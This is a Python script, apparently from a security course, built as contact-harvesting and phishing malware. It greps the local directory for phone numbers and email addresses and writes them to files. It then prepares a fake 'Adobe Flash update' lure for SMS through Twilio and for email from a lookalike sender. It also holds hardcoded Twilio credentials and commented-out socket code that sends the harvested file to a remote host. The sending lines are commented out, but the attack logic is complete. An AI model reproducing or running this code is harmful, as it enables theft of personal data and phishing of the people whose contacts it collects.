import os
from twilio.rest import TwilioRestClient
import socket
import smtplib
from email.mime.text import MIMEText
import Crypto
from Crypto.PublicKey import RSA
from Crypto import Random
from base64 import b64decode
import sys

grep_numbers = "grep -roh '\(([0-9]\{3\})\|[0-9]\{3\}\)[ -]\?[0-9]\{3\}[ -]\?[0-9]\{4\}' . | sort -u > phonenumbers.txt"
grep_emails = "grep -Eroh '\\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\\b' . | sort -u > emails.txt"

os.system(grep_numbers)
os.system(grep_emails)

key64 = b'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuPWBgF4lw44cjPMO74LQfM4F0FnJDU4B   \
           lW8lEXriqep85cN8LLuzHu5hVnVXTY2Dasc2dOUhsb6x4C4O9nW+cOG2sqBE/S5y74B+iOnr3ZtnpG \
           015wTZW66HL3Z4+imPI9IhL2y1Mgpc7FK5ti6R3//njsHHS46ks5PhWo8tvIGViiaEHTr9lO5bOhaTl \
           JgdbxU+NpBgnjk+XikQLCvXJ+5TNe6LvMxp6UUnU9vQM50L0g/JPQhAfIXm/HE0w1YQ1c4DFEJoFBjGo \
           Uq0krQEacSeTgaWauBTtedGCvtwsRFkNXk90RyQx4q/Q4Khk6uGtSPP9YxsUM7hCm2QDOPp1wIDAQAB'

keyDER = b64decode(key64)
pubkey = RSA.importKey(keyDER)
privkeyfp = open('private.pem','r')
privkey = RSA.importKey(privkeyfp.read(),passphrase='cs460')

fp_numbers = open('phonenumbers.txt', 'r')
fp_emails = open('emails.txt','r')
numbers_plain = "PHONE_NUMBER_HEADER\n" + fp_numbers.read()
emails_plain = "EMAILS_HEADER\n" + fp_emails.read()
#numbers_cipher = pubkey.encrypt(numbers_plain, 0)
emails_cipher = pubkey.encrypt(emails_plain, 0)
fp_numbers.seek(0)
fp_emails.seek(0)

#print privkey.decrypt(numbers_cipher))
#print privkey.decrypt(emails_cipher)

numbers_list = []
emails_list = []
for number in fp_numbers:
	numbers_list.append(number.rstrip())
for email in fp_emails:
	emails_list.append(email.rstrip())
#print numbers_list
#print emails_list

fp_numbers.close()
fp_emails.close()

client = TwilioRestClient('ACb89307719aa8043871f9912452ef21c6','2f56bc2c9d8ae27afa3baf74fb46f0cb')
text_body = "Hey have you heard about the new Adobe flash update? Download it here: "
for number in numbers_list:
	try:
		#client.messages.create(from_="+12175763259",to=number,body=text_body)
		no_op = 0
	except:
		no_op = 0



server = smtplib.SMTP()
msg = MIMEText("Hey have you heard about the new Adobe flash update? Download it here: ")
me = "aadoobeeflashy@gmail.com"
msg['Subject'] = "Adobe Flash 1337 Update"
msg['From'] = me
s = smtplib.SMTP('localhost')

for email in emails_list:
	you = email
	msg['To'] = you
	#s.sendmail(me, [you], msg.as_string())
s.quit()

# s = socket.socket()         # Create a socket object
# host = '10.0.2.15'  
# port = 12345                 # Reserve a port for your service.
# s.connect((host, port))
# print "asdf"
# f = open('phonenumbers.txt','rb')
# print 'Sending...'
# l = f.read(1024)
# while (l):
#     print 'Sending...'
#     s.send(l)
#     l = f.read(1024)
# f.close()
# print "Done Sending"
# s.shutdown(socket,SHUT_WR)
# print s.recv(1024)
# s.close                     # Close the socket when done

# TCP_IP = '10.0.2.15'
# TCP_PORT = 12345
# BUFFER_SIZE = 1024
# MESSAGE = "Hello, World!" 
# s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# print "ASDF"
# s.connect((TCP_IP, TCP_PORT))
# s.send(MESSAGE)
# data = s.recv(BUFFER_SIZE)
# s.close()
# print "received data:", data